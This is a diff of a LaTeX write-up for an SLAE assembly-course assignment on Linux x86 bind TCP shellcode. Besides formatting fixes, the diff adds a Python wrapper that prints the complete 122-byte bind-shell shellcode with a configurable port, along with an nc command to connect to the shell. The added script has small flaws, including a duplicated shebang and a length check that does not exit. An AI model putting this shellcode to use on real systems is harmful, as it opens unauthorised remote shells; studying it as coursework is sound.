@@ -1,4 +1,4 @@
-% Created 2016-12-16 Fri 14:24
+% Created 2016-12-18 Sun 21:29
 \documentclass[11pt]{article}
 \usepackage[utf8]{inputenc}
 \usepackage[T1]{fontenc}
@@ -41,7 +41,7 @@ Student ID: SLAE-824
 \label{sec-1-1}
 
 \begin{itemize}
-\item Create a Shell$_{\text{Bind}}$$_{\text{TCP}}$ shellcode
+\item Create a Shell Bind TCP shellcode
 \begin{itemize}
 \item Bind to a port
 \item Execs Shell on incoming connection
@@ -312,7 +312,7 @@ Lets lookup some values of constants:
 #define AF_INET   2 /* Internet IP Protocol   */
 \end{verbatim}
 
-I had a hard time finding where SOCK$_{\text{STREAM}}$ was defined so we use
+I had a hard time finding where \verb~SOCK_STREAM~ was defined so we use
 a little gcc magic to see what the macro expands to:
 
 \begin{verbatim}
@@ -329,7 +329,7 @@ int lsock = socket(2, SOCK_STREAM, 0);
 global _start
 ;; Note: We will store 2 file descriptors along the way
 ;; We will put the listening socket file descriptor in edi
-;; We will put the connection socket file descriptor in esi
+;; We will put the connection socket file descriptor in ebx
 
 section .text
   _start:
@@ -518,7 +518,46 @@ Run with: \verb~./shellcode~
 Connect with: \verb~nc -nv 127.0.0.1 4444~
 
 
-And it works! We get our shell. The shellcode is 122 bytes without really
-trying to optimize. We can go back and see if we can do better now.
+And it works! We get our shell. The shellcode is 122 bytes without
+really trying to optimize. We can always go back and try to
+optimize. We also need to update the program to make the port number
+easily configurable.
+
+Let's write a wrapper script to set our port. We just accept the port
+as a command line argument to our script and interpolate it into our
+shellcode and print out the result:
+
+\begin{verbatim}
+#!/usr/bin/python
+
+#!/usr/bin/python
+
+import sys
+
+if len(sys.argv) != 2:
+  print "Fail!"
+
+port_number     = int(sys.argv[1])
+bts             = [port_number >> i & 0xff for i in (24,16,8,0)]
+filtered        = [b for b in bts if b > 0]
+formatted       = ["\\x" + format(b, 'x') for b in filtered]
+joined          = "".join(formatted)
+
+shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
+shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x31\\xc9"
+shellcode+="\\x51\\x66\\x68" + joined + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57"
+shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x31\\xc9\\x51\\x57"
+shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x31\\xc9\\x51\\x51"
+shellcode+="\\x57\\x89\\xe1\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
+shellcode+="\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68"
+shellcode+="\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
+
+print(shellcode)
+\end{verbatim}
+
+Once we have our script we print out our updated shellcode and pop it back
+into our shellcode.c stub program, compile and test a connection. When we do,
+we get our shell again. And even better, we can change the port to whatever we
+would like to yield the proper shellcode.
 % Emacs 24.5.1 (Org mode 8.2.10)
 \end{document}
